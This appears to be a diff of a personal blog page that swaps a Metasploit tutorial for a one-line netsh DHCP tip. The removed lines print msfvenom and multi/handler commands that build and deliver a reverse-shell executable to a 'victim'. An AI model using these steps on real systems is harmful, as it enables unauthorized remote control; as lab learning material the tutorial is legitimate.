@@ -3,23 +3,21 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Hack Windows 10-8-8.1-7 With Metasploit | &lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~</title>
+  <title>using cmd on WIndows to set interface on DHCP mode | &lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="How to hack windows 10-8-8.1-7 with MetasploitStepsGenerate an executable file123msfvenom -p windows/meterpreter/reverse_tcpLHOST=192.168.130.132 LPORT=4444 -f exe &amp;gt; /root/Desktop/WindowsPath.exe
-T">
+  <meta name="description" content="设置本地网卡DHCP模式netsh interface ip set address name=”本地连接” source=dhcp
+本地连接为想要设置的网卡">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hack Windows 10-8-8.1-7 With Metasploit">
-<meta property="og:url" content="http://0daybug.github.io/2016/04/12/Hack-Windows-10-8-8-1-7-With-Metasploit/index.html">
+<meta property="og:title" content="using cmd on WIndows to set interface on DHCP mode">
+<meta property="og:url" content="http://0daybug.github.io/2016/06/13/using-cmd-on-WIndows-to-set-interface-on-DHCP-mode/index.html">
 <meta property="og:site_name" content="<(￣ c￣)y▂ξ 真煩,來哈根草吧~">
-<meta property="og:description" content="How to hack windows 10-8-8.1-7 with MetasploitStepsGenerate an executable file123msfvenom -p windows/meterpreter/reverse_tcpLHOST=192.168.130.132 LPORT=4444 -f exe &amp;gt; /root/Desktop/WindowsPath.exe
-T">
-<meta property="og:image" content="http://7xs1w6.com1.z0.glb.clouddn.com/apache.png">
-<meta property="og:image" content="http://7xs1w6.com1.z0.glb.clouddn.com/shell.jpg">
-<meta property="og:updated_time" content="2016-04-12T12:56:35.000Z">
+<meta property="og:description" content="设置本地网卡DHCP模式netsh interface ip set address name=”本地连接” source=dhcp
+本地连接为想要设置的网卡">
+<meta property="og:updated_time" content="2016-06-13T11:27:16.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hack Windows 10-8-8.1-7 With Metasploit">
-<meta name="twitter:description" content="How to hack windows 10-8-8.1-7 with MetasploitStepsGenerate an executable file123msfvenom -p windows/meterpreter/reverse_tcpLHOST=192.168.130.132 LPORT=4444 -f exe &amp;gt; /root/Desktop/WindowsPath.exe
-T">
+<meta name="twitter:title" content="using cmd on WIndows to set interface on DHCP mode">
+<meta name="twitter:description" content="设置本地网卡DHCP模式netsh interface ip set address name=”本地连接” source=dhcp
+本地连接为想要设置的网卡">
   
     <link rel="alternative" href="/atom.xml" title="&lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~" type="application/atom+xml">
   
@@ -221,11 +219,11 @@ T">
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-Hack-Windows-10-8-8-1-7-With-Metasploit" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-using-cmd-on-WIndows-to-set-interface-on-DHCP-mode" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/04/12/Hack-Windows-10-8-8-1-7-With-Metasploit/" class="article-date">
-      <time datetime="2016-04-12T12:17:04.000Z" itemprop="datePublished">2016-04-12</time>
+      <a href="/2016/06/13/using-cmd-on-WIndows-to-set-interface-on-DHCP-mode/" class="article-date">
+      <time datetime="2016-06-13T11:25:40.000Z" itemprop="datePublished">2016-06-13</time>
 </a>
     </div>
   
@@ -238,7 +236,7 @@ T">
         
   
     <h1 class="article-title" itemprop="name">
-      Hack Windows 10-8-8.1-7 With Metasploit
+      using cmd on WIndows to set interface on DHCP mode
     </h1>
   
 
@@ -249,7 +247,7 @@ T">
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/">Metasploit</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/乱七八糟/">乱七八糟</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -259,17 +257,8 @@ T">
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="How-to-hack-windows-10-8-8-1-7-with-Metasploit"><a href="#How-to-hack-windows-10-8-8-1-7-with-Metasploit" class="headerlink" title="How to hack windows 10-8-8.1-7 with Metasploit"></a>How to hack windows 10-8-8.1-7 with Metasploit</h3><h3 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h3><h2 id="Generate-an-executable-file"><a href="#Generate-an-executable-file" class="headerlink" title="Generate an executable file"></a>Generate an executable file</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=<span class="number">192.168</span>.<span class="number">130.132</span> LPORT=<span class="number">4444</span> <span class="operator">-f</span> exe &gt; /root/Desktop/</span><br><span class="line">WindowsPath.exe</span><br></pre></td></tr></table></figure>
-<p>The “LHOST” is our local machine!<br>The WindowsPath.exe is the executable file which we<br>will use later on target machine</p>
-<h2 id="Using-multi-handler"><a href="#Using-multi-handler" class="headerlink" title="Using multi handler"></a>Using multi handler</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.open the msfconsole</span><br><span class="line">Just run the <span class="built_in">command</span> <span class="string">"msfconsole"</span></span><br><span class="line"><span class="number">2</span>.use multi handler</span><br><span class="line">Just run the <span class="built_in">command</span> <span class="string">"use multi/handler"</span></span><br><span class="line"><span class="number">3</span>.set Payload</span><br><span class="line">Just run the <span class="built_in">command</span> <span class="string">"set PAYLOAD windows/meterpreter/reverse_tcp"</span></span><br><span class="line"><span class="number">4</span>.Set LHOST and LPORT on Kali Linux</span><br><span class="line">Just run the following <span class="built_in">command</span></span><br><span class="line"><span class="string">"set LHOST 192.168.130.132"</span></span><br><span class="line"><span class="string">"set LPORT 4444"</span></span><br></pre></td></tr></table></figure>
-<h2 id="Start-the-apache2-service-in-Debian"><a href="#Start-the-apache2-service-in-Debian" class="headerlink" title="Start the apache2 service in Debian"></a>Start the apache2 service in Debian</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. We open the apache2 service</span><br><span class="line">Just run <span class="built_in">command</span> <span class="string">"service apache2 start"</span></span><br><span class="line"><span class="number">2</span>. Open the browser and enter <span class="string">"localhost"</span> to see</span><br><span class="line"><span class="keyword">if</span> the apache server was working!</span><br></pre></td></tr></table></figure>
-<p><img src="http://7xs1w6.com1.z0.glb.clouddn.com/apache.png" alt=""></p>
-<p>Well my server works quit Well. Let’s continue</p>
-<h2 id="Put-the-executable-file-in-our-server"><a href="#Put-the-executable-file-in-our-server" class="headerlink" title="Put the executable file in our server"></a>Put the executable file in our server</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"cp /root/Desktop/WindowsPath.exe /var/www/mybase/"</span></span><br><span class="line">Notice: I change the location of DocumentRoot.</span><br><span class="line">If you don<span class="string">'t know how to change the location, pls google, ZZ</span></span><br></pre></td></tr></table></figure>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Just run <span class="string">"exploit"</span></span><br><span class="line">When the victim open the WindowsPath.exe file, our</span><br><span class="line">work was done.</span><br></pre></td></tr></table></figure>
-<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Run <span class="string">"sysinfo"</span> to see the version of Windows</span><br><span class="line">Run “shell” to open the shell of Windows</span><br></pre></td></tr></table></figure>
-<p>Here is my Test,i finish it on my virtual machines.<br><img src="http://7xs1w6.com1.z0.glb.clouddn.com/shell.jpg" alt=""></p>
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.offensive-security.com/metasploit-unleashed/binary-payloads/" target="_blank" rel="external">Binary-Payloads</a></p>
+        <h3 id="设置本地网卡DHCP模式"><a href="#设置本地网卡DHCP模式" class="headerlink" title="设置本地网卡DHCP模式"></a>设置本地网卡DHCP模式</h3><p>netsh interface ip set address name=”本地连接” source=dhcp</p>
+<p>本地连接为想要设置的网卡</p>
 
       
     </div>
@@ -278,13 +267,13 @@ T">
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/04/12/Hack-Windows-10-8-8-1-7-With-Metasploit/">Hack Windows 10-8-8.1-7 With Metasploit</a></p>
+        <p><span>本文标题:</span><a href="/2016/06/13/using-cmd-on-WIndows-to-set-interface-on-DHCP-mode/">using cmd on WIndows to set interface on DHCP mode</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Dylan Kios 的个人博客">Dylan Kios</a></p>
-        <p><span>发布时间:</span>2016年04月12日 - 20时17分</p>
-        <p><span>最后更新:</span>2016年04月12日 - 20时56分</p>
+        <p><span>发布时间:</span>2016年06月13日 - 19时25分</p>
+        <p><span>最后更新:</span>2016年06月13日 - 19时27分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/04/12/Hack-Windows-10-8-8-1-7-With-Metasploit/" title="Hack Windows 10-8-8.1-7 With Metasploit">http://0daybug.github.io/2016/04/12/Hack-Windows-10-8-8-1-7-With-Metasploit/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://0daybug.github.io/2016/04/12/Hack-Windows-10-8-8-1-7-With-Metasploit/　　作者: Dylan Kios" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2016/06/13/using-cmd-on-WIndows-to-set-interface-on-DHCP-mode/" title="using cmd on WIndows to set interface on DHCP mode">http://0daybug.github.io/2016/06/13/using-cmd-on-WIndows-to-set-interface-on-DHCP-mode/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0daybug.github.io/2016/06/13/using-cmd-on-WIndows-to-set-interface-on-DHCP-mode/　　作者: Dylan Kios" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -297,16 +286,10 @@ T">
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2016/04/23/Windows克隆Administrator账户实验/">
-                    Windows克隆Administrator账户实验
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2016/04/12/MS08-067/">
-                    MS08-067
+                <a href="/2016/06/12/Understanding-Network-Hacks-Scapy/">
+                    Understanding Network Hacks--Scapy
                 </a>
             </div>
         
@@ -317,7 +300,7 @@ T">
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-hack-windows-10-8-8-1-7-with-Metasploit"><span class="toc-number">1.</span> <span class="toc-text">How to hack windows 10-8-8.1-7 with Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Steps"><span class="toc-number">2.</span> <span class="toc-text">Steps</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Generate-an-executable-file"><span class="toc-number"></span> <span class="toc-text">Generate an executable file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Using-multi-handler"><span class="toc-number"></span> <span class="toc-text">Using multi handler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Start-the-apache2-service-in-Debian"><span class="toc-number"></span> <span class="toc-text">Start the apache2 service in Debian</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Put-the-executable-file-in-our-server"><span class="toc-number"></span> <span class="toc-text">Put the executable file in our server</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number"></span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Test"><span class="toc-number"></span> <span class="toc-text">Test</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">1.</span> <span class="toc-text">Reference</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#设置本地网卡DHCP模式"><span class="toc-number">1.</span> <span class="toc-text">设置本地网卡DHCP模式</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -381,7 +364,7 @@ T">
   
   <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="Hack-Windows-10-8-8-1-7-With-Metasploit" data-title="Hack Windows 10-8-8.1-7 With Metasploit" data-url="http://0daybug.github.io/2016/04/12/Hack-Windows-10-8-8-1-7-With-Metasploit/"></div>
+    <div class="ds-thread" data-thread-key="using-cmd-on-WIndows-to-set-interface-on-DHCP-mode" data-title="using cmd on WIndows to set interface on DHCP mode" data-url="http://0daybug.github.io/2016/06/13/using-cmd-on-WIndows-to-set-interface-on-DHCP-mode/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -405,15 +388,13 @@ T">
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/04/23/Windows克隆Administrator账户实验/" title="上一篇: Windows克隆Administrator账户实验">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2016/04/12/MS08-067/" title="下一篇: MS08-067">
+            <a href="/2016/06/12/Understanding-Network-Hacks-Scapy/" title="下一篇: Understanding Network Hacks--Scapy">
                 <i class="fa fa-angle-right"></i>
             </a>
         
